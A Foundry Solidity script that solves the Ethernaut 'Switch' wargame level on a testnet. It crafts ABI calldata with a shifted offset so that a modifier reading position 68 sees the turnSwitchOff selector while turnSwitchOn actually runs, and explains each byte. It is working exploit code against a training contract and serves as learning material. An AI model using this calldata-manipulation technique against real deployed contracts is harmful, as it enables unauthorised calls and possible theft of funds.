// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Switch} from "../src/Switch.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Switch.s.sol --tc SwitchSolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract SwitchSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = vm.envAddress("SWITCH_INSTANCE");

    /*  In this challenge we need to turn the switch on.
        This can only be done with the turnSwitchOn function. But notice that the function can only be called by the contract itself.
        We can use the flipSwitch function to call the turnSwitchOn function.

        The onlyOff modifier uses assembly with the opcode calldatacopy to copy the function selector from the calldata to a memory location.
        It starts at position 68 of the calldata and copies 4 bytes (the size of a function selector) into a memory location (selector).

        Basically we need to create a special calldata where at the position 68 we have the function selector of the turnSwitchOff function.

        Let recall how dynamic inputs are passed to a function in solidity:
        - The first 4 bytes are the function selector
        - The next 32 bytes are the offset to the start of the data, notice that the data has two parts, the length and the data itself
        - The next 32 bytes are the length of the data
        - The next N bytes are the data

        In this case we will called the flipSwitch function directly so we dont need to worry about the first 4 bytes (function selector)
        We will use bytes.concat to create the calldata with the following structure:
        Notice that everything in the calldata is mult of 32 bytes besides the fist 4 bytes as the function selector
        - [0-31] bytes are the offset to the start of the data, in this case 0x60 (96 in decimal)
        - [32-63] bytes can be anything since we just want the 4 bytes starting at position 68 to be the function selector of the turnSwitchOff function
        - [64-95] bytes starting with 4 bytes as the function selector of the turnSwitchOff function
        The actual data of the function to be called notice that using the offset of 0x60 we are skipping the first 96 bytes of the calldata jumping straight to here byte 96
        - [96-128] 4 bytes to indicate the length of the data
        - [128-159] the actual data of the function to be called, which will be the function selector of the turnSwitchOn function


    */


    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        Switch switchInstance = Switch(instance);

        // grab the function selectors
        bytes4 flipSwitchSelector = switchInstance.flipSwitch.selector;
        bytes4 turnSwitchOffSelector = switchInstance.turnSwitchOff.selector;
        bytes4 turnSwitchOnSelector = switchInstance.turnSwitchOn.selector;

        // create the calldata
        bytes32 offset = bytes32(uint256(96));
        bytes32 uselessData = bytes32(uint256(0));
        bytes32 turnSwitchOffData = bytes32(turnSwitchOffSelector);

        bytes32 length = bytes32(uint256(4));
        bytes32 turnSwitchOnData = bytes32(turnSwitchOnSelector);

        bytes memory data = bytes.concat(flipSwitchSelector, offset, uselessData, turnSwitchOffData, length, turnSwitchOnData);

        // Notice that we need to make a low level call in order to call the flipSwitch function because 4 + 32 + 32 = 68

        // this is the calldata in hex that we are passing to the contract 
        /*  30c13ade
            0000000000000000000000000000000000000000000000000000000000000060
            0000000000000000000000000000000000000000000000000000000000000000
            20606e1500000000000000000000000000000000000000000000000000000000
            0000000000000000000000000000000000000000000000000000000000000004
            76227e1200000000000000000000000000000000000000000000000000000000
        */

        (bool success,) = address(switchInstance).call(data);
        require(success, "call failed :(");

        console.log("Switch is on: %s", switchInstance.switchOn());

        vm.stopBroadcast();
    }

}
